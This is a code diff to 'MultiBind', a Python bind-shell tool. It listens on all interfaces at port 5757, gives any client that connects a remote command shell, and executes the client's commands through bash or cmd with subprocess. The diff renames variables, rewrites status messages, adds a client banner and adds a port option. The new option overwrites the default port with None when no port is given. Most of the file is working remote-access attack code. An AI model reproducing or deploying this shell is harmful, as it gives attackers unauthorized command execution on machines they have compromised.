@@ -12,7 +12,7 @@ from colorama import init, Fore, Back, Style
 os_type = platform.platform()
 pwd = os.getcwd
 
-DEFAULT_PORT = 5757
+port = 5757
 MAX_BUFFER = 4096
 
 
@@ -53,7 +53,7 @@ def execute_bash(bash):
         output = subprocess.check_output("bash {}".format(bash),
                                          stderr=subprocess.STDOUT)
     except:
-        output = b"Command Failed!"
+        output = b"Failed to Execute Command!"
     return output
 
 
@@ -62,7 +62,7 @@ def execute_cmd(cmd):
         output = subprocess.check_output(
             "cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
     except:
-        output = b"Command Failed!"
+        output = b"Failed to Execute Command!"
     return output
 
 
@@ -71,12 +71,12 @@ def decode_and_strip(s):
 
 
 def shell_thread(s):
-    s.send(b"[ -- Connected! --]")
+    s.send(b"[+] Binded")
 
     try:
         while True:
 
-            s.send(b"\r\nEnter Command> ")
+            s.send(b"\r\n MultiBind Shell> ")
 
             data = s.recv(MAX_BUFFER)
             if data:
@@ -115,7 +115,7 @@ def recv_thread(s):
         exit()
 
 
-def banner():
+def banner_server():
     print(Fore.GREEN + """
    ▄▄▄▄███▄▄▄▄   ███    █▄   ▄█           ███      ▄█ 
  ▄██▀▀▀███▀▀▀██▄ ███    ███ ███       ▀█████████▄ ███ 
@@ -135,26 +135,50 @@ def banner():
   ███    ███ ███  ███   ███ ███   ▄███                
 ▄█████████▀  █▀    ▀█   █▀  ████████▀                                                               
         """ + Fore.RESET)
+    haxor_print("Bind The World: Server", 0)
 
+def banner_client():
+    print(Fore.CYAN + """
+   ▄▄▄▄███▄▄▄▄   ███    █▄   ▄█           ███      ▄█ 
+ ▄██▀▀▀███▀▀▀██▄ ███    ███ ███       ▀█████████▄ ███ 
+ ███   ███   ███ ███    ███ ███          ▀███▀▀██ ███▌
+ ███   ███   ███ ███    ███ ███           ███   ▀ ███▌
+ ███   ███   ███ ███    ███ ███           ███     ███▌
+ ███   ███   ███ ███    ███ ███           ███     ███ 
+ ███   ███   ███ ███    ███ ███▌    ▄     ███     ███ 
+  ▀█   ███   █▀  ████████▀  █████▄▄██    ▄████▀   █▀  
+                            ▀                         
+▀█████████▄   ▄█  ███▄▄▄▄   ████████▄                 
+  ███    ███ ███  ███▀▀▀██▄ ███   ▀███                
+  ███    ███ ███▌ ███   ███ ███    ███                
+ ▄███▄▄▄██▀  ███▌ ███   ███ ███    ███                
+▀▀███▀▀▀██▄  ███▌ ███   ███ ███    ███                
+  ███    ██▄ ███  ███   ███ ███    ███                
+  ███    ███ ███  ███   ███ ███   ▄███                
+▄█████████▀  █▀    ▀█   █▀  ████████▀                                                               
+        """ + Fore.RESET)
+    haxor_print("Bind the World: Client", 0)
 
 def server():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("0.0.0.0", DEFAULT_PORT))
+    s.bind(("0.0.0.0", port))
     s.listen()
-    banner()
-    haxor_print("--- Starting Bind Shell ---", 0)
-    haxor_print("[+] Opened Port: {}{}".format(DEFAULT_PORT, Fore.GREEN), 0)
+    banner_server()
+    haxor_print("[*] Starting Server", 0)
+    haxor_print("[+] Opened Port: {}{}".format(port, Fore.GREEN), 0)
     while True:
         client_socket, addr = s.accept()
-        print("[+] New Bind From: {}".format(public_ip))
+        print(Fore.RESET + "[+] New Bind From: {}".format(public_ip))
         threading.Thread(target=shell_thread, args=(client_socket,)).start()
 
 
 def client(ip):
+    banner_client()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, DEFAULT_PORT))
+    s.connect((ip, port))
 
-    haxor_print("--- Connnecting to Multibind ---")
+    haxor_print("[*] Connecting to MultiBind")
+    print("[+] OS Detected: {}{}{}".format(Fore.GREEN, os_type, Fore.RESET))
 
     threading.Thread(target=send_thread, args=(s,)).start()
     threading.Thread(target=recv_thread, args=(s,)).start()
@@ -168,7 +192,12 @@ parser.add_argument("-l", "--listen", action="store_true",
 parser.add_argument("-c", "--connect",
                     help="Connect to a bind shell", required=False)
 
+parser.add_argument("-p", "--port", type=int,
+                    help="Change listening port", required=False)
+
 args = parser.parse_args()
+
+port = args.port
 
 if args.listen:
     server()
